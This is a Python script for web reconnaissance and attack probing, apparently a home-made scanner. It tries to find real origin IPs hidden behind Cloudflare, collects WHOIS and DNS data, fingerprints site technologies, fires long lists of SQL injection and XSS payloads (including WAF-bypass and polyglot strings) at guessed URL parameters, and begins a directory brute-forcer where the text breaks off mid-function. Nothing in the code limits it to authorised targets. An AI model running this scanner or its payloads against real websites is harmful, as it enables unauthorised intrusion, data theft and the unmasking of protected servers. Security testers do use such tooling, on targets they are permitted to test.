import requests
import re
import json
import time
import random
import ipaddress
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init
import ssl
import socket
from datetime import datetime
import dns.resolver
import whois
import subprocess
import os

init()

def print_colored(text, color=Fore.WHITE):
    print(f"{color}{text}{Style.RESET_ALL}")

def get_real_ip_behind_cloudflare(domain):
    print_colored("[INFO] Attempting to find real IP behind Cloudflare...", Fore.YELLOW)
    
    real_ips = []
    
    subdomains = ['direct', 'origin', 'admin', 'cpanel', 'mail', 'ftp', 'ssh', 'dev', 'staging', 'test']
    
    for subdomain in subdomains:
        try:
            full_domain = f"{subdomain}.{domain}"
            ip = socket.gethostbyname(full_domain)
            
            if not is_cloudflare_ip(ip):
                real_ips.append({'subdomain': full_domain, 'ip': ip, 'method': 'subdomain_enum'})
                print_colored(f"✅ Found potential real IP: {ip} ({full_domain})", Fore.GREEN)
        except:
            continue
    
    try:
        print_colored("[INFO] Checking direct access patterns...", Fore.CYAN)
        
        direct_patterns = [
            f"direct-{domain}",
            f"origin-{domain}",
            f"{domain.split('.')[0]}-direct.{'.'.join(domain.split('.')[1:])}",
            f"www-{domain}",
            f"old-{domain}",
            f"backup-{domain}",
            f"server-{domain}",
            f"host-{domain}"
        ]
        
        for pattern in direct_patterns:
            try:
                ip = socket.gethostbyname(pattern)
                if not is_cloudflare_ip(ip):
                    real_ips.append({'subdomain': pattern, 'ip': ip, 'method': 'direct_pattern'})
                    print_colored(f"✅ Found potential real IP: {ip} ({pattern})", Fore.GREEN)
            except:
                continue
                
    except Exception as e:
        print_colored(f"[WARNING] Direct pattern check failed: {str(e)}", Fore.YELLOW)
    
    try:
        print_colored("[INFO] Checking IPv6 records...", Fore.CYAN)
        ipv6_records = dns.resolver.resolve(domain, 'AAAA')
        for record in ipv6_records:
            ipv6_str = str(record)
            real_ips.append({'subdomain': f"IPv6: {domain}", 'ip': ipv6_str, 'method': 'ipv6_record'})
            print_colored(f"✅ Found IPv6: {ipv6_str}", Fore.GREEN)
    except:
        pass
    
    try:
        print_colored("[INFO] Checking MX records and mail servers...", Fore.CYAN)
        mx_records = dns.resolver.resolve(domain, 'MX')
        for mx in mx_records:
            try:
                mx_domain = str(mx.exchange).rstrip('.')
                mx_ip = socket.gethostbyname(mx_domain)
                if not is_cloudflare_ip(mx_ip):
                    real_ips.append({'subdomain': f"MX: {mx_domain}", 'ip': mx_ip, 'method': 'mx_record'})
                    print_colored(f"✅ Found IP via MX record: {mx_ip} ({mx_domain})", Fore.GREEN)
                    
                    mx_base = mx_domain.replace('mail.', '').replace('mx.', '').replace('smtp.', '')
                    if mx_base != domain:
                        try:
                            alt_ip = socket.gethostbyname(mx_base)
                            if not is_cloudflare_ip(alt_ip) and alt_ip != mx_ip:
                                real_ips.append({'subdomain': f"MX-derived: {mx_base}", 'ip': alt_ip, 'method': 'mx_derived'})
                                print_colored(f"✅ Found IP via MX derivation: {alt_ip} ({mx_base})", Fore.GREEN)
                        except:
                            pass
            except:
                continue
    except:
        pass
    
    try:
        print_colored("[INFO] Checking service subdomains...", Fore.CYAN)
        service_subdomains = [
            'webmail', 'autodiscover', 'autoconfig', 'pop', 'imap', 'smtp',
            'ns1', 'ns2', 'dns', 'whm', 'plesk', 'directadmin', 'vesta',
            'git', 'svn', 'jenkins', 'ci', 'build', 'deploy'
        ]
        
        for service in service_subdomains:
            try:
                service_domain = f"{service}.{domain}"
                service_ip = socket.gethostbyname(service_domain)
                if not is_cloudflare_ip(service_ip):
                    real_ips.append({'subdomain': service_domain, 'ip': service_ip, 'method': 'service_subdomain'})
                    print_colored(f"✅ Found IP via service subdomain: {service_ip} ({service_domain})", Fore.GREEN)
            except:
                continue
    except Exception as e:
        print_colored(f"[WARNING] Service subdomain check failed: {str(e)}", Fore.YELLOW)
    
    # Method 6: Try DNS history via public APIs
    try:
        print_colored("[INFO] Checking DNS history via public APIs...", Fore.CYAN)
        
        # Try HackerTarget API for DNS history
        try:
            history_url = f"https://api.hackertarget.com/hostsearch/?q={domain}"
            response = requests.get(history_url, timeout=10)
            if response.status_code == 200 and response.text:
                lines = response.text.strip().split('\n')
                for line in lines:
                    if ',' in line and not line.startswith('error'):
                        parts = line.split(',')
                        if len(parts) >= 2:
                            subdomain = parts[0].strip()
                            ip = parts[1].strip()
                            if not is_cloudflare_ip(ip) and ip != 'IP':
                                real_ips.append({'subdomain': subdomain, 'ip': ip, 'method': 'dns_history'})
                                print_colored(f"✅ Found historical IP: {ip} ({subdomain})", Fore.GREEN)
        except Exception as e:
            print_colored(f"[WARNING] HackerTarget API failed: {str(e)}", Fore.YELLOW)
        
        # Try VirusTotal API (passive DNS)
        try:
            vt_url = f"https://www.virustotal.com/vtapi/v2/domain/report"
            vt_params = {
                'apikey': 'public',  # This would need a real API key
                'domain': domain
            }
            # Note: This would need a real VirusTotal API key to work
            # For now, we'll skip this to avoid API key requirements
        except:
            pass
            
    except Exception as e:
        print_colored(f"[WARNING] DNS history check failed: {str(e)}", Fore.YELLOW)
    
    # Method 7: Check for certificate transparency logs
    try:
        print_colored("[INFO] Checking certificate transparency logs...", Fore.CYAN)
        
        # Try crt.sh for certificate transparency
        crt_url = f"https://crt.sh/?q={domain}&output=json"
        response = requests.get(crt_url, timeout=15)
        if response.status_code == 200:
            try:
                certs = response.json()
                found_domains = set()
                for cert in certs[:20]:
                    name_value = cert.get('name_value', '')
                    if name_value:
                        for cert_domain in name_value.split('\n'):
                            cert_domain = cert_domain.strip()
                            if cert_domain and not cert_domain.startswith('*') and domain in cert_domain:
                                found_domains.add(cert_domain)
                
                for cert_domain in found_domains:
                    try:
                        cert_ip = socket.gethostbyname(cert_domain)
                        if not is_cloudflare_ip(cert_ip):
                            real_ips.append({'subdomain': cert_domain, 'ip': cert_ip, 'method': 'certificate_transparency'})
                            print_colored(f"✅ Found IP via certificate transparency: {cert_ip} ({cert_domain})", Fore.GREEN)
                    except:
                        continue
                        
            except json.JSONDecodeError:
                pass
    except Exception as e:
        print_colored(f"[WARNING] Certificate transparency check failed: {str(e)}", Fore.YELLOW)
    
    return real_ips

def is_cloudflare_ip(ip):
    cloudflare_ranges = [
        # IPv4 ranges
        '173.245.48.0/20', '103.21.244.0/22', '103.22.200.0/22',
        '103.31.4.0/22', '141.101.64.0/18', '108.162.192.0/18',
        '190.93.240.0/20', '188.114.96.0/20', '197.234.240.0/22',
        '198.41.128.0/17', '162.158.0.0/15', '104.16.0.0/13',
        '104.24.0.0/14', '172.64.0.0/13', '131.0.72.0/22',
        # Additional ranges
        '199.27.128.0/21', '199.27.136.0/21', '199.27.144.0/20',
        '199.27.160.0/19', '199.27.192.0/18', '199.27.224.0/19',
        '199.27.248.0/21', '199.27.252.0/22', '199.27.254.0/23',
        '199.27.255.0/24', '199.27.255.128/25', '199.27.255.192/26',
        '199.27.255.224/27', '199.27.255.240/28', '199.27.255.248/29',
        '199.27.255.252/30', '199.27.255.254/31', '199.27.255.255/32',
        # More recent ranges
        '172.65.0.0/16', '172.66.0.0/16', '172.67.0.0/16',
        '104.17.0.0/16', '104.18.0.0/16', '104.19.0.0/16',
        '104.20.0.0/16', '104.21.0.0/16', '104.22.0.0/16',
        '104.23.0.0/16', '104.25.0.0/16', '104.26.0.0/16',
        '104.27.0.0/16', '104.28.0.0/16', '104.29.0.0/16',
        '104.30.0.0/16', '104.31.0.0/16'
    ]
    
    try:
        ip_obj = ipaddress.ip_address(ip)
        for cidr in cloudflare_ranges:
            if ip_obj in ipaddress.ip_network(cidr):
                return True
    except:
        pass
    return False

def get_whois_info(domain):
    try:
        w = whois.whois(domain)
        return {
            'registrar': w.registrar,
            'creation_date': str(w.creation_date),
            'expiration_date': str(w.expiration_date),
            'name_servers': w.name_servers,
            'status': w.status,
            'country': w.country,
            'org': w.org,
            'emails': w.emails
        }
    except Exception as e:
        return {'error': str(e)}

def get_dns_records(domain):
    records = {}
    
    record_types = ['A', 'AAAA', 'CNAME', 'MX', 'TXT', 'NS', 'SOA']
    
    for record_type in record_types:
        try:
            answers = dns.resolver.resolve(domain, record_type)
            records[record_type] = [str(answer) for answer in answers]
        except:
            records[record_type] = []
    
    return records

def get_website_info(url, use_cloudflare_bypass=False):
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        if use_cloudflare_bypass:
            headers.update({
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'max-age=0',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1'
            })
        
        response = requests.get(url, timeout=15, allow_redirects=True, headers=headers)
        
        domain = urlparse(url).netloc
        
        try:
            server_ip = socket.gethostbyname(domain)
            is_behind_cloudflare = is_cloudflare_ip(server_ip)
        except:
            server_ip = 'Unknown'
            is_behind_cloudflare = False
        
        info = {
            'url': url,
            'domain': domain,
            'server_ip': server_ip,
            'is_behind_cloudflare': is_behind_cloudflare,
            'status_code': response.status_code,
            'final_url': response.url,
            'headers': dict(response.headers),
            'content_length': len(response.content),
            'response_time': response.elapsed.total_seconds(),
            'encoding': response.encoding,
            'content_type': response.headers.get('content-type', 'Unknown'),
            'server': response.headers.get('server', 'Unknown'),
            'powered_by': response.headers.get('x-powered-by', 'Unknown'),
            'cloudflare_ray': response.headers.get('cf-ray', None),
            'cloudflare_cache': response.headers.get('cf-cache-status', None)
        }
        
        if is_behind_cloudflare:
            print_colored("[INFO] Website is behind Cloudflare", Fore.YELLOW)
            real_ips = get_real_ip_behind_cloudflare(domain)
            info['real_ips'] = real_ips
        
        whois_info = get_whois_info(domain)
        info['whois'] = whois_info
        
        dns_records = get_dns_records(domain)
        info['dns_records'] = dns_records
        
        return info, response.text
        
    except Exception as e:
        return {'error': str(e)}, None

def detect_technologies(html_content, headers):
    technologies = []
    
    tech_patterns = {
        'WordPress': [r'wp-content', r'wp-includes', r'/wp-json/', r'wp-admin', r'wp-login', r'wordpress'],
        'Joomla': [r'joomla', r'com_content', r'option=com_', r'/administrator/', r'joomla\.css'],
        'Drupal': [r'drupal', r'sites/default', r'misc/drupal', r'drupal\.js', r'drupal\.css'],
        'Magento': [r'magento', r'skin/frontend', r'var/view_preprocessed', r'mage/cookies', r'checkout/cart'],
        'Shopify': [r'shopify', r'cdn\.shopify\.com', r'Shopify\.theme', r'shopify\.com'],
        'PrestaShop': [r'prestashop', r'/modules/', r'/themes/', r'prestashop\.css'],
        'OpenCart': [r'opencart', r'catalog/view', r'index\.php\?route='],
        'WooCommerce': [r'woocommerce', r'wc-', r'wp-content/plugins/woocommerce'],
        
        # JavaScript Frameworks
        'React': [r'react', r'__REACT_DEVTOOLS_GLOBAL_HOOK__', r'react\.js', r'react\.min\.js'],
        'Angular': [r'angular', r'ng-app', r'ng-controller', r'angular\.js', r'angular\.min\.js'],
        'Vue.js': [r'vue', r'v-if', r'v-for', r'vue\.js', r'vue\.min\.js'],
        'jQuery': [r'jquery', r'\$\(document\)\.ready', r'jquery\.js', r'jquery\.min\.js'],
        'Ember.js': [r'ember', r'ember\.js', r'ember\.min\.js'],
        'Backbone.js': [r'backbone', r'backbone\.js', r'backbone\.min\.js'],
        'Svelte': [r'svelte', r'svelte\.js'],
        'Alpine.js': [r'alpine', r'x-data', r'x-show'],
        
        # CSS Frameworks
        'Bootstrap': [r'bootstrap', r'btn btn-', r'container-fluid', r'bootstrap\.css', r'bootstrap\.min\.css'],
        'Foundation': [r'foundation', r'foundation\.css', r'foundation\.min\.css'],
        'Bulma': [r'bulma', r'bulma\.css', r'bulma\.min\.css'],
        'Tailwind CSS': [r'tailwind', r'tailwindcss', r'tw-'],
        'Materialize': [r'materialize', r'materialize\.css', r'materialize\.min\.css'],
        'Semantic UI': [r'semantic', r'semantic\.css', r'semantic\.min\.css'],
        
        # Backend Frameworks
        'Laravel': [r'laravel_session', r'_token', r'csrf-token', r'laravel\.com'],
        'Django': [r'csrfmiddlewaretoken', r'django', r'__admin_media_prefix__', r'django\.contrib'],
        'Flask': [r'flask', r'session\[', r'url_for', r'flask\.pocoo'],
        'Express.js': [r'express', r'X-Powered-By.*Express'],
        'Ruby on Rails': [r'rails', r'authenticity_token', r'csrf-param', r'csrf-token'],
        'ASP.NET': [r'asp\.net', r'__VIEWSTATE', r'__EVENTVALIDATION', r'aspnet'],
        'Spring': [r'spring', r'springframework', r'jsessionid'],
        'CodeIgniter': [r'codeigniter', r'ci_session', r'index\.php/'],
        'Symfony': [r'symfony', r'_symfony', r'symfony\.com'],
        'CakePHP': [r'cakephp', r'cake_session', r'cakephp\.org'],
        'Zend': [r'zend', r'zend_session', r'zendframework'],
        'Yii': [r'yii', r'yii_session', r'yiiframework'],
        
        # Web Servers
        'Apache': [r'apache', r'Server.*Apache'],
        'Nginx': [r'nginx', r'Server.*nginx'],
        'IIS': [r'Server.*IIS', r'X-AspNet-Version'],
        'LiteSpeed': [r'litespeed', r'Server.*LiteSpeed'],
        'Cloudflare': [r'cloudflare', r'CF-RAY', r'__cfduid', r'cf-cache-status'],
        
        # Analytics & Tracking
        'Google Analytics': [r'google-analytics', r'gtag\(', r'ga\(', r'googletagmanager'],
        'Google Tag Manager': [r'googletagmanager', r'gtm\.js'],
        'Facebook Pixel': [r'facebook\.net/tr', r'fbq\(', r'facebook pixel'],
        'Hotjar': [r'hotjar', r'hj\(', r'hotjar\.com'],
        'Mixpanel': [r'mixpanel', r'mixpanel\.com'],
        'Adobe Analytics': [r'adobe', r'omniture', r'sitecatalyst'],
        
        # CDNs & Services
        'Cloudflare': [r'cloudflare', r'cf-ray', r'cloudflare\.com'],
        'AWS CloudFront': [r'cloudfront', r'amazonaws\.com'],
        'MaxCDN': [r'maxcdn', r'netdna-cdn'],
        'KeyCDN': [r'keycdn', r'kxcdn\.com'],
        'jsDelivr': [r'jsdelivr', r'cdn\.jsdelivr\.net'],
        'cdnjs': [r'cdnjs', r'cdnjs\.cloudflare\.com'],
        'unpkg': [r'unpkg', r'unpkg\.com'],
        
        # E-commerce
        'Stripe': [r'stripe', r'stripe\.com', r'stripe\.js'],
        'PayPal': [r'paypal', r'paypal\.com', r'paypalobjects'],
        'Square': [r'square', r'squareup\.com'],
        'Shopify Payments': [r'shopify.*payment', r'shopify.*checkout'],
        
        # Icons & Fonts
        'Font Awesome': [r'font-awesome', r'fa fa-', r'fas fa-', r'fontawesome'],
        'Google Fonts': [r'fonts\.googleapis\.com', r'google.*fonts'],
        'Typekit': [r'typekit', r'use\.typekit\.net'],
        
        # Development Tools
        'Webpack': [r'webpack', r'webpackJsonp'],
        'Parcel': [r'parcel', r'parcel-bundler'],
        'Gulp': [r'gulp', r'gulpfile'],
        'Grunt': [r'grunt', r'gruntfile'],
        
        # Security
        'reCAPTCHA': [r'recaptcha', r'google\.com/recaptcha'],
        'hCaptcha': [r'hcaptcha', r'hcaptcha\.com'],
        'Cloudflare Turnstile': [r'turnstile', r'cf-turnstile'],
        
        # Databases (from error messages)
        'MySQL': [r'mysql', r'mysqli', r'mysql_'],
        'PostgreSQL': [r'postgresql', r'postgres', r'psql'],
        'MongoDB': [r'mongodb', r'mongo'],
        'Redis': [r'redis'],
        'SQLite': [r'sqlite'],
        
        # Programming Languages
        'PHP': [r'php', r'\.php', r'phpsessid'],
        'Python': [r'python', r'\.py'],
        'Node.js': [r'node\.js', r'nodejs'],
        'Java': [r'java', r'\.jsp', r'jsessionid'],
        'C#': [r'\.aspx', r'\.ashx'],
        'Ruby': [r'ruby', r'\.rb'],
        'Go': [r'golang', r'go'],
        'Rust': [r'rust'],
        
        # Other
        'Docker': [r'docker'],
        'Kubernetes': [r'kubernetes', r'k8s'],
        'Varnish': [r'varnish', r'X-Varnish'],
        'Memcached': [r'memcached'],
        'ElasticSearch': [r'elasticsearch', r'elastic'],
    }
    
    content_lower = html_content.lower() if html_content else ""
    headers_str = str(headers).lower()
    
    for tech, patterns in tech_patterns.items():
        for pattern in patterns:
            if re.search(pattern, content_lower) or re.search(pattern, headers_str):
                technologies.append(tech)
                break
    
    server = headers.get('Server', '')
    if server:
        technologies.append(f"Server: {server}")
    
    powered_by = headers.get('X-Powered-By', '')
    if powered_by:
        technologies.append(f"Powered by: {powered_by}")
    
    return list(set(technologies))

def check_security_headers(headers):
    security_headers = {
        'Strict-Transport-Security': 'HSTS - Forces HTTPS connections',
        'Content-Security-Policy': 'CSP - Prevents XSS attacks',
        'X-Frame-Options': 'Prevents clickjacking attacks',
        'X-Content-Type-Options': 'Prevents MIME type sniffing',
        'X-XSS-Protection': 'Built-in XSS protection',
        'Referrer-Policy': 'Controls referrer information',
        'Permissions-Policy': 'Controls browser features',
        'Expect-CT': 'Certificate Transparency',
        'Public-Key-Pins': 'HTTP Public Key Pinning'
    }
    
    present = []
    missing = []
    
    for header, description in security_headers.items():
        if header in headers:
            present.append(f"{header}: {description}")
        else:
            missing.append(f"{header}: {description}")
    
    return present, missing

def test_sql_injection(url):
    """Test for SQL injection vulnerabilities with comprehensive payloads"""
    print_colored("[INFO] Testing for SQL injection vulnerabilities...", Fore.YELLOW)
    
    # Comprehensive SQL injection payloads
    payloads = [
        # Basic boolean-based
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 'a'='a",
        "1' OR '1'='1' --",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' or 1=1#",
        "' or 1=1--",
        "' or 1=1/*",
        ") or '1'='1--",
        ") or ('1'='1--",
        
        # Union-based
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT NULL--",
        "' UNION SELECT user(),version(),database()--",
        "' UNION SELECT @@version--",
        
        # Time-based blind
        "'; WAITFOR DELAY '00:00:05'--",
        "'; SELECT SLEEP(5)--",
        "'; pg_sleep(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
        "' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL) OR 'vRxe'='vRxe",
        
        # Error-based
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
        "' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        
        # NoSQL injection
        "' || '1'=='1",
        "' && '1'=='1",
        "'; return true; //",
        "' || true || '",
        "' && false && '",
        
        # Advanced payloads
        "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
        "1' AND (SELECT SUBSTRING(user(),1,1))='r'--",
        "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        "1' AND (SELECT LENGTH(database()))>0--",
        
        # WAF bypass attempts
        "/*!50000 OR 1=1*/",
        "/*!UNION*/ /*!SELECT*/ NULL--",
        "un/**/ion sel/**/ect",
        "' OR 1=1 LIMIT 1 OFFSET 0--",
        "' OR 1=1 ORDER BY 1--",
        "' GROUP BY 1 HAVING 1=1--",
    ]
    
    test_params = [
        'id', 'user', 'username', 'email', 'search', 'q', 'query', 'name',
        'page', 'category', 'type', 'sort', 'order', 'filter', 'keyword',
        'login', 'password', 'token', 'session', 'key', 'value', 'data',
        'item', 'product', 'article', 'post', 'comment', 'message'
    ]
    
    vulnerabilities = []
    
    for param in test_params[:5]:
        for payload in payloads[:15]:
            try:
                test_url = f"{url}?{param}={requests.utils.quote(payload)}"
                response = requests.get(test_url, timeout=10, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                })
                
                error_patterns = [
                    # MySQL
                    r'mysql_fetch_array', r'mysql_fetch_assoc', r'mysql_fetch_row',
                    r'mysql_num_rows', r'mysql_result', r'mysql_query',
                    r'You have an error in your SQL syntax', r'MySQL server version',
                    r'supplied argument is not a valid MySQL',
                    
                    # PostgreSQL
                    r'PostgreSQL.*ERROR', r'pg_query\(\)', r'pg_exec\(\)',
                    r'ERROR:.*syntax error', r'ERROR:.*relation.*does not exist',
                    
                    # SQL Server
                    r'Microsoft.*ODBC.*SQL Server', r'ODBC SQL Server Driver',
                    r'SQLServer JDBC Driver', r'SqlException',
                    r'System\.Data\.SqlClient\.SqlException',
                    
                    # Oracle
                    r'ORA-\d+', r'Oracle.*Driver', r'Oracle.*Error',
                    r'Oracle.*Exception', r'oracle\.jdbc',
                    
                    # SQLite
                    r'SQLite.*error', r'sqlite3\.OperationalError',
                    r'SQLite3::SQLException',
                    
                    # Generic
                    r'Warning.*mysql_', r'valid MySQL result',
                    r'MySqlClient\.', r'com\.mysql\.jdbc',
                    r'Zend_Db_(Adapter|Statement)', r'Pdo[./_\\]Mysql',
                    r'MySqlException', r'SQLSTATE\[\d+\]',
                    r'Unclosed quotation mark', r'quoted string not properly terminated',
                    r'SQL command not properly ended', r'unexpected end of SQL command',
                    
                    # Framework specific
                    r'ActiveRecord::StatementInvalid', r'ActiveRecord::RecordNotFound',
                    r'Doctrine\\DBAL\\Exception', r'PDOException',
                    r'java\.sql\.SQLException', r'org\.hibernate\.exception',
                    
                    # NoSQL
                    r'MongoError', r'CouchDB.*error', r'Redis.*error'
                ]
                
                response_text = response.text.lower()
                
                for pattern in error_patterns:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        vulnerabilities.append({
                            'type': 'SQL Injection',
                            'severity': 'High',
                            'parameter': param,
                            'payload': payload,
                            'url': test_url,
                            'evidence': pattern,
                            'response_code': response.status_code
                        })
                        print_colored(f"[VULN] SQL Injection found: {param} parameter", Fore.RED)
                        break
                
                if response.elapsed.total_seconds() > 4 and any(sleep_payload in payload.lower() for sleep_payload in ['sleep', 'waitfor', 'pg_sleep']):
                    vulnerabilities.append({
                        'type': 'Time-based SQL Injection',
                        'severity': 'High',
                        'parameter': param,
                        'payload': payload,
                        'url': test_url,
                        'evidence': f'Response time: {response.elapsed.total_seconds():.2f}s',
                        'response_code': response.status_code
                    })
                    print_colored(f"[VULN] Time-based SQL Injection found: {param} parameter", Fore.RED)
                        
            except Exception as e:
                continue
            
            time.sleep(0.2)  # Rate limiting
    
    return vulnerabilities

def test_xss_vulnerabilities(url):
    """Test for XSS vulnerabilities with comprehensive payloads"""
    print_colored("[INFO] Testing for XSS vulnerabilities...", Fore.YELLOW)
    
    # Comprehensive XSS payloads
    payloads = [
        # Basic script tags
        "<script>alert('XSS')</script>",
        "<script>alert(1)</script>",
        "<script>confirm('XSS')</script>",
        "<script>prompt('XSS')</script>",
        
        # Event handlers
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        
        # JavaScript protocols
        "javascript:alert('XSS')",
        "javascript:alert(1)",
        "javascript:confirm('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        
        # HTML5 vectors
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<object data=javascript:alert('XSS')>",
        "<embed src=javascript:alert('XSS')>",
        
        # Filter bypass attempts
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "<img src=\"x\" onerror=\"alert('XSS')\">",
        "<svg/onload=alert('XSS')>",
        "<img/src=x/onerror=alert('XSS')>",
        "<<SCRIPT>alert('XSS')<</SCRIPT>",
        
        # Encoding bypass
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&lt;script&gt;alert('XSS')&lt;/script&gt;",
        
        # Context-specific
        "';alert('XSS');//",
        "\";alert('XSS');//",
        "';alert(String.fromCharCode(88,83,83))//",
        "\"-alert('XSS')-\"",
        "'-alert('XSS')-'",
        
        # WAF bypass
        "<script>alert`XSS`</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>eval('al'+'ert(\"XSS\")')</script>",
        "<script>window['alert']('XSS')</script>",
        "<script>top['alert']('XSS')</script>",
        
        # DOM-based
        "<script>document.write('<img src=x onerror=alert(1)>')</script>",
        "<script>document.location='javascript:alert(1)'</script>",
        "<script>window.location='javascript:alert(1)'</script>",
        
        # CSS injection
        "<style>@import'javascript:alert(\"XSS\")';</style>",
        "<link rel=stylesheet href=javascript:alert('XSS')>",
        "<style>body{background:url('javascript:alert(1)')}</style>",
        
        # Advanced vectors
        "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
        "<svg><script href=\"data:,alert('XSS')\"/>",
        "<iframe srcdoc=\"<script>alert('XSS')</script>\">",
        "<form><button formaction=javascript:alert('XSS')>Click",
        
        # Template injection
        "{{alert('XSS')}}",
        "${alert('XSS')}",
        "#{alert('XSS')}",
        "<%=alert('XSS')%>",
        
        # AngularJS
        "{{constructor.constructor('alert(1)')()}}",
        "{{$on.constructor('alert(1)')()}}",
        
        # React
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        
        # Polyglot
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//"
    ]
    
    # Test parameters for XSS
    test_params = [
        'q', 'search', 'query', 'keyword', 'term', 'name', 'message', 'comment',
        'title', 'description', 'content', 'text', 'value', 'input', 'data',
        'username', 'email', 'url', 'link', 'redirect', 'callback', 'return'
    ]
    
    vulnerabilities = []
    
    for param in test_params[:8]:  # Test first 8 parameters
        for payload in payloads[:20]:  # Test first 20 payloads
            try:
                test_url = f"{url}?{param}={requests.utils.quote(payload)}"
                response = requests.get(test_url, timeout=10, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                })
                
                # Check for reflected XSS
                if payload in response.text or requests.utils.unquote(payload) in response.text:
                    vulnerabilities.append({
                        'type': 'Reflected XSS',
                        'severity': 'High',
                        'parameter': param,
                        'payload': payload,
                        'url': test_url,
                        'evidence': 'Payload reflected in response',
                        'response_code': response.status_code
                    })
                    print_colored(f"[VULN] Reflected XSS found: {param} parameter", Fore.RED)
                
                # Check for DOM XSS indicators
                dom_indicators = [
                    'document.write', 'innerHTML', 'outerHTML', 'document.location',
                    'window.location', 'eval(', 'setTimeout(', 'setInterval(',
                    'Function(', 'execScript(', 'msWriteProfilerMark('
                ]
                
                for indicator in dom_indicators:
                    if indicator in response.text and payload in response.text:
                        vulnerabilities.append({
                            'type': 'Potential DOM XSS',
                            'severity': 'Medium',
                            'parameter': param,
                            'payload': payload,
                            'url': test_url,
                            'evidence': f'DOM sink detected: {indicator}',
                            'response_code': response.status_code
                        })
                        print_colored(f"[VULN] Potential DOM XSS found: {param} parameter", Fore.YELLOW)
                        break
                
                # Check for stored XSS by looking for script execution contexts
                script_contexts = [
                    '<script', 'javascript:', 'onload=', 'onerror=', 'onclick=',
                    'onmouseover=', 'onfocus=', 'onblur=', 'onchange='
                ]
                
                response_lower = response.text.lower()
                payload_lower = payload.lower()
                
                for context in script_contexts:
                    if context in payload_lower and context in response_lower:
                        # Additional check to see if it's in an executable context
                        if any(tag in response_lower for tag in ['<script', '<img', '<svg', '<iframe', '<object']):
                            vulnerabilities.append({
                                'type': 'Potential Stored XSS',
                                'severity': 'High',
                                'parameter': param,
                                'payload': payload,
                                'url': test_url,
                                'evidence': f'Script context detected: {context}',
                                'response_code': response.status_code
                            })
                            print_colored(f"[VULN] Potential Stored XSS found: {param} parameter", Fore.RED)
                            break
                        
            except Exception as e:
                continue
            
            time.sleep(0.2)  # Rate limiting
    
    return vulnerabilities

def load_directory_wordlist():
    wordlist_file = os.path.join(os.path.dirname(__file__), 'common_directories.txt')
    
    try:
        with open(wordlist_file, 'r', encoding='utf-8') as f:
            directories = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        print_colored(f"[INFO] Loaded {len(directories)} directories from wordlist", Fore.CYAN)
        return directories
    except FileNotFoundError:
        print_colored("[WARNING] Wordlist file not found, using default list", Fore.YELLOW)
        return [
            'admin', 'administrator', 'wp-admin', 'login', 'dashboard', 'panel',
            'cpanel', 'control', 'manager', 'phpmyadmin', 'mysql', 'database',
            'backup', 'backups', 'old', 'test', 'dev', 'staging', 'beta',
            'api', 'v1', 'v2', 'rest', 'graphql', 'uploads', 'files', 'images',
            'assets', 'static', 'css', 'js', 'scripts', 'includes', 'lib',
            'config', 'configuration', 'settings', 'install', 'setup', 'readme',
            'documentation', 'docs', 'help', 'support', 'contact', 'about',
            'robots.txt', 'sitemap.xml', '.htaccess', '.env', 'web.config'
        ]

def directory_bruteforce(url, max_dirs=None, use_cloudflare_bypass=False):
    print_colored("[INFO] Performing advanced directory bruteforce...", Fore.YELLOW)
    
    directories = load_directory_wordlist()
    
    if max_dirs:
        directories = directories[:max_dirs]
        print_colored(f"[INFO] Limited to {max_dirs} directories", Fore.CYAN)
    
    found_dirs = []
    checked = 0
    
    def check_directory(directory):
        nonlocal checked
        try:
            test_url = urljoin(url, directory)
            
            headers = {
